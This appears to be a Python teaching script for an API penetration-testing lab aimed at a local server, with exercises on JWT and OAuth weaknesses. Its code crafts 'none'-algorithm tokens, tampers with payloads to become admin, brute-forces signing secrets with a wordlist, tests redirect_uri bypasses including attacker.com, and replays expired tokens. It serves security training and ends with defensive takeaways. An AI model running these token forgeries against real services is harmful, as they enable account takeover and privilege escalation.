#!/usr/bin/env python3
"""
API Penetration Testing Lab - Intermediate Lab 1: JWT and Authentication Attacks

Topics: JWT manipulation, token analysis, algorithm attacks, privilege escalation
Difficulty: Intermediate
"""

import requests
import json
import base64
import hmac
import hashlib
from urllib.parse import urljoin
from typing import Dict, Any

BASE_URL = "http://localhost:5000/api"

class JWTAuthenticationLab:
    """Lab for JWT and authentication attacks"""
    
    def __init__(self):
        self.session = requests.Session()
        self.base_url = BASE_URL
    
    # EXERCISE 1: Understanding JWT Structure
    def exercise_1_jwt_structure(self):
        """
        Exercise 1: Understand JWT token structure
        
        Learning Goals:
        - JWT token format (Header.Payload.Signature)
        - Base64 encoding/decoding
        - JWT claims and payloads
        
        Tasks:
        1. Obtain a JWT token
        2. Decode each component
        3. Understand the structure
        """
        print("\n=== Exercise 1: JWT Structure Analysis ===")
        
        # Get a JWT token
        print("\n[Task 1] Obtaining JWT token...")
        try:
            response = self.session.post(
                urljoin(self.base_url, "/auth/login"),
                json={"username": "admin", "password": "password123"}
            )
            
            if response.status_code == 200:
                token = response.json().get('token')
                if token:
                    print(f"[+] Token obtained successfully")
                    self.analyze_jwt(token)
        except Exception as e:
            print(f"Error: {e}")
    
    def analyze_jwt(self, token: str):
        """Analyze JWT token structure"""
        print("\n[Task 2] Analyzing JWT structure...")
        try:
            parts = token.split('.')
            if len(parts) != 3:
                print(f"[-] Invalid JWT format (expected 3 parts, got {len(parts)})")
                return
            
            header, payload, signature = parts
            
            # Decode header
            header_decoded = base64.urlsafe_b64decode(header + '==').decode('utf-8')
            print(f"\n[Header]")
            header_json = json.loads(header_decoded)
            print(f"  {json.dumps(header_json, indent=2)}")
            
            # Decode payload
            payload_decoded = base64.urlsafe_b64decode(payload + '==').decode('utf-8')
            print(f"\n[Payload]")
            payload_json = json.loads(payload_decoded)
            print(f"  {json.dumps(payload_json, indent=2)}")
            
            print(f"\n[Signature]")
            print(f"  {signature[:20]}...")
            
        except Exception as e:
            print(f"Error analyzing JWT: {e}")
    
    # EXERCISE 2: JWT Algorithm Attacks
    def exercise_2_algorithm_attacks(self):
        """
        Exercise 2: Test JWT algorithm vulnerabilities
        
        Learning Goals:
        - 'none' algorithm attack
        - Algorithm confusion attacks
        - Key weakness exploitation
        
        Tasks:
        1. Test 'none' algorithm
        2. Attempt algorithm downgrade
        """
        print("\n=== Exercise 2: JWT Algorithm Attacks ===")
        
        print("\n[Task 1] Testing 'none' algorithm vulnerability...")
        
        # Create a JWT with 'none' algorithm
        header = base64.urlsafe_b64encode(json.dumps(
            {"alg": "none", "typ": "JWT"}
        ).encode()).decode().rstrip('=')
        
        payload = base64.urlsafe_b64encode(json.dumps(
            {"user_id": 1, "username": "admin", "role": "admin"}
        ).encode()).decode().rstrip('=')
        
        none_jwt = f"{header}.{payload}."
        
        print(f"Crafted JWT with 'none' algorithm")
        print(f"Token: {none_jwt[:50]}...")
        
        # Test the token
        try:
            headers = {"Authorization": f"Bearer {none_jwt}"}
            response = self.session.get(
                urljoin(self.base_url, "/protected/users"),
                headers=headers
            )
            
            if response.status_code == 200:
                print(f"[!] VULNERABILITY: 'none' algorithm accepted!")
                print(f"    Status: {response.status_code}")
            else:
                print(f"[-] Token rejected (Status: {response.status_code})")
        except Exception as e:
            print(f"Error: {e}")
    
    # EXERCISE 3: JWT Payload Manipulation
    def exercise_3_payload_manipulation(self):
        """
        Exercise 3: Manipulate JWT payloads
        
        Learning Goals:
        - Change JWT claims
        - Escalate privileges
        - Bypass authentication
        
        Tasks:
        1. Decode original JWT
        2. Modify claims
        3. Test modified JWT
        """
        print("\n=== Exercise 3: JWT Payload Manipulation ===")
        
        print("\n[Task 1] Testing payload modification...")
        
        # Get a legitimate token first
        try:
            response = self.session.post(
                urljoin(self.base_url, "/auth/login"),
                json={"username": "user", "password": "password"}
            )
            
            if response.status_code == 200:
                original_token = response.json().get('token')
                if original_token:
                    print(f"[+] Original token obtained")
                    
                    # Try to modify it (will fail with proper signature)
                    parts = original_token.split('.')
                    header = parts[0]
                    signature = parts[2]
                    
                    # Create modified payload
                    modified_payload = base64.urlsafe_b64encode(json.dumps(
                        {"user_id": 1, "username": "admin", "role": "admin"}
                    ).encode()).decode().rstrip('=')
                    
                    modified_token = f"{header}.{modified_payload}.{signature}"
                    
                    # Test modified token
                    headers = {"Authorization": f"Bearer {modified_token}"}
                    response = self.session.get(
                        urljoin(self.base_url, "/protected/admin"),
                        headers=headers
                    )
                    
                    if response.status_code == 200:
                        print(f"[!] Modified token accepted!")
                    else:
                        print(f"[-] Modified token rejected (Status: {response.status_code})")
        except Exception as e:
            print(f"Error: {e}")
    
    # EXERCISE 4: JWT Secret Key Weakness
    def exercise_4_weak_secret(self):
        """
        Exercise 4: Test weak JWT secrets
        
        Learning Goals:
        - Dictionary attacks on secrets
        - Common weak secrets
        - Secret brute forcing
        
        Tasks:
        1. Test common secrets
        2. Attempt to forge tokens
        """
        print("\n=== Exercise 4: Weak JWT Secret ===")
        
        print("\n[Task 1] Testing common JWT secrets...")
        
        common_secrets = [
            "secret",
            "123456",
            "password",
            "admin",
            "jwt_secret",
            "key",
            "test",
        ]
        
        # Prepare a token to verify
        header = json.dumps({"alg": "HS256", "typ": "JWT"})
        payload = json.dumps({"user_id": 1, "username": "admin"})
        
        for secret in common_secrets:
            try:
                # Create signature
                message = f"{base64.urlsafe_b64encode(header.encode()).decode().rstrip('=')}.{base64.urlsafe_b64encode(payload.encode()).decode().rstrip('=')}"
                signature = base64.urlsafe_b64encode(
                    hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
                ).decode().rstrip('=')
                
                test_token = f"{message}.{signature}"
                
                # Test the forged token
                headers = {"Authorization": f"Bearer {test_token}"}
                response = self.session.get(
                    urljoin(self.base_url, "/protected/users"),
                    headers=headers
                )
                
                if response.status_code == 200:
                    print(f"[!] Weak secret found: '{secret}'")
                    print(f"    Successfully forged admin token")
                    break
            except Exception:
                pass
    
    # EXERCISE 5: OAuth 2.0 Vulnerabilities
    def exercise_5_oauth_vulnerabilities(self):
        """
        Exercise 5: Test OAuth 2.0 vulnerabilities
        
        Learning Goals:
        - Redirect URI manipulation
        - Authorization code interception
        - Token replay attacks
        
        Tasks:
        1. Test redirect_uri parameter
        2. Analyze authorization flows
        """
        print("\n=== Exercise 5: OAuth 2.0 Vulnerabilities ===")
        
        print("\n[Task 1] Testing redirect_uri manipulation...")
        
        # Test common redirect_uri bypass techniques
        test_urls = [
            "http://localhost:5000/callback",
            "http://localhost/callback",
            "http://attacker.com/callback",
            "http://localhost:5000/callback?extra=param",
            "http://localhost:5000/callback#fragment",
        ]
        
        for redirect_uri in test_urls:
            try:
                params = {
                    "client_id": "test_client",
                    "redirect_uri": redirect_uri,
                    "response_type": "code",
                    "scope": "openid profile",
                }
                
                response = self.session.get(
                    urljoin(self.base_url, "/oauth/authorize"),
                    params=params,
                    allow_redirects=False
                )
                
                if response.status_code in [302, 301]:
                    print(f"[!] Redirect accepted: {redirect_uri}")
                    print(f"    Location: {response.headers.get('Location', 'N/A')[:100]}")
            except Exception:
                pass
    
    # EXERCISE 6: Token Expiration and Refresh
    def exercise_6_token_expiration(self):
        """
        Exercise 6: Test token expiration handling
        
        Learning Goals:
        - Expired token acceptance
        - Refresh token vulnerabilities
        - Session fixation
        
        Tasks:
        1. Test expired tokens
        2. Test refresh token endpoints
        """
        print("\n=== Exercise 6: Token Expiration & Refresh ===")
        
        print("\n[Task 1] Testing expired token acceptance...")
        
        # Create an expired token (simulated)
        header = base64.urlsafe_b64encode(
            json.dumps({"alg": "HS256", "typ": "JWT"}).encode()
        ).decode().rstrip('=')
        
        payload = base64.urlsafe_b64encode(
            json.dumps({
                "user_id": 1,
                "exp": 1000000000,  # Expired (year 2001)
            }).encode()
        ).decode().rstrip('=')
        
        expired_token = f"{header}.{payload}.signature"
        
        try:
            headers = {"Authorization": f"Bearer {expired_token}"}
            response = self.session.get(
                urljoin(self.base_url, "/protected/users"),
                headers=headers
            )
            
            if response.status_code == 200:
                print(f"[!] Expired token accepted!")
            else:
                print(f"[-] Expired token properly rejected (Status: {response.status_code})")
        except Exception as e:
            print(f"Error: {e}")
    
    def run_all_exercises(self):
        """Run all exercises"""
        print("\n" + "="*60)
        print("API Penetration Testing Lab - Intermediate Lab 1")
        print("JWT and Authentication Attacks")
        print("="*60)
        
        self.exercise_1_jwt_structure()
        self.exercise_2_algorithm_attacks()
        self.exercise_3_payload_manipulation()
        self.exercise_4_weak_secret()
        self.exercise_5_oauth_vulnerabilities()
        self.exercise_6_token_expiration()
        
        print("\n" + "="*60)
        print("Lab Completed!")
        print("="*60)
        print("\nKey Takeaways:")
        print("1. Always validate JWT algorithm")
        print("2. Use strong secrets for signing")
        print("3. Verify token expiration")
        print("4. Properly validate redirect URIs")
        print("\nNext: Lab 2 - Injection Attacks")

if __name__ == "__main__":
    try:
        lab = JWTAuthenticationLab()
        lab.run_all_exercises()
    except KeyboardInterrupt:
        print("\n\nLab interrupted by user.")
    except Exception as e:
        print(f"\nLab error: {e}")
